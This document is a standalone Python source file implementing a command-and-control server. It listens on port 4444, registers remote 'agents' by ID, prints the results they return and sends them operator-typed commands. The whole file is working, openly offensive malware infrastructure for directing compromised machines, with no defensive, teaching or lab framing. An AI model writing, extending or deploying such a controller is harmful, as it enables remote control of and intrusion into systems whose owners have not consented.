import socket
import threading
import json
import base64

class C2Server:
    def __init__(self, host='0.0.0.0', port=4444):
        self.host = host
        self.port = port
        self.agents = {}
        
    def start(self):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind((self.host, self.port))
        server.listen(5)
        print(f"[+] C2 Server listening on {self.host}:{self.port}")
        
        while True:
            client_socket, addr = server.accept()
            print(f"[+] New connection from {addr[0]}:{addr[1]}")
            client_handler = threading.Thread(
                target=self.handle_agent,
                args=(client_socket,)
            )
            client_handler.start()
    
    def handle_agent(self, client_socket):
        while True:
            try:
                request = client_socket.recv(1024).decode()
                if not request:
                    break
                    
                data = json.loads(request)
                agent_id = data.get('agent_id')
                command = data.get('command')
                result = data.get('result')
                
                if agent_id not in self.agents:
                    self.agents[agent_id] = client_socket
                    print(f"[+] New agent registered: {agent_id}")
                
                if result:
                    print(f"[+] Result from {agent_id}: {result}")
                
                # Send new command to agent
                new_command = input(f"Command for {agent_id}> ")
                if new_command:
                    response = {'command': new_command}
                    client_socket.send(json.dumps(response).encode())
                    
            except Exception as e:
                print(f"[-] Error: {e}")
                break

if __name__ == "__main__":
    server = C2Server()
    server.start()